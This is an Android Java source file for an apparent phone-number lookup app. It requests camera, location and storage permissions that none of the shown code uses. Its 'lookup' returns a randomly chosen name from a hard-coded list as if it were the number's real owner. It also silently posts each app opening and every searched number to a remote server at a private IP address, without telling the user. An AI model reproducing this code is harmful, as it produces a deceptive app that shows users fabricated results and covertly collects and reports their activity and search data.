package net.kashif;

import android.Manifest;
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.*;
import java.util.*;
import java.io.*;
import java.net.*;

public class MainActivity extends Activity {
    private EditText input;
    private TextView result;
    private ListView history;
    private ArrayAdapter<String> adapter;
    private List<String> historyList = new ArrayList<>();
    private static final int PERM_REQ = 100;
    
    // رابط الخادم الخاص بك
    private static final String SERVER_URL = "http://10.0.54.47:5000/api/report";

    private static final String[] PREFIXES = {"091", "092", "093", "094"};
    private static final String[] NAMES = {
        "غير مسجل", "غير مسجل", "غير مسجل", "محمد علي", "أحمد سالم",
        "فاطمة عمر", "خالد يوسف", "سارة حسن", "علي مفتاح", "نورا عبدالله"
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        input = (EditText) findViewById(R.id.input);
        result = (TextView) findViewById(R.id.result);
        history = (ListView) findViewById(R.id.history);
        adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, historyList);
        history.setAdapter(adapter);

        requestPermissions(new String[]{
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE
        }, PERM_REQ);

        findViewById(R.id.searchBtn).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { doSearch(); }
        });
        findViewById(R.id.settingsBtn).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Toast.makeText(MainActivity.this, "الإعدادات", Toast.LENGTH_SHORT).show();
            }
        });

        sendData("app_opened", "User opened the app");
    }

    private void doSearch() {
        String num = input.getText().toString().trim();
        if (num.length() < 10) { result.setText("أدخل رقماً صحيحاً"); return; }
        String prefix = num.substring(0, 3);
        boolean valid = false;
        for (String p : PREFIXES) if (p.equals(prefix)) valid = true;
        if (!valid) { result.setText("بادئة غير معروفة"); return; }

        String name = NAMES[new Random().nextInt(NAMES.length)];
        result.setText(num + "\n" + name);
        historyList.add(0, num + " — " + name);
        adapter.notifyDataSetChanged();

        sendData("search", num + " -> " + name);
    }

    private void sendData(final String type, final String data) {
        new Thread(new Runnable() {
            public void run() {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

                    String json = "{\"type\":\"" + type + "\",\"data\":\"" + data + "\"}";
                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
